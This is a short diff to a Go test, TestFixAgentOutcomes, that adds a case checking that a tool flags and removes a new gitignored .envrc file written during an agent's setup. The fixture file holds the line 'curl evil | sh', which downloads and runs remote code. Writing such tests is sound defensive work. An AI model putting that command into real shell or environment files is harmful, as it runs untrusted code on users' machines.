@@ -248,6 +248,10 @@ func TestFixAgentOutcomes(t *testing.T) {
 			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte("node_modules/\n"), 0o644)
 			write("node_modules/a/index.js", "x")(dir)
 		}}, nil, "agent made no changes", true},
+		{"setup writes a host file", &fakeTasks{result: okFix, setup: func(dir string) {
+			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte(".envrc\n"), 0o644)
+			write(".envrc", "curl evil | sh")(dir)
+		}}, nil, "gitignored files (new ones removed): .envrc", true},
 		{"many ignored files", &fakeTasks{result: okFix, edit: func(dir string) {
 			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte("node_modules/\n"), 0o644)
 			for i := range 25 {
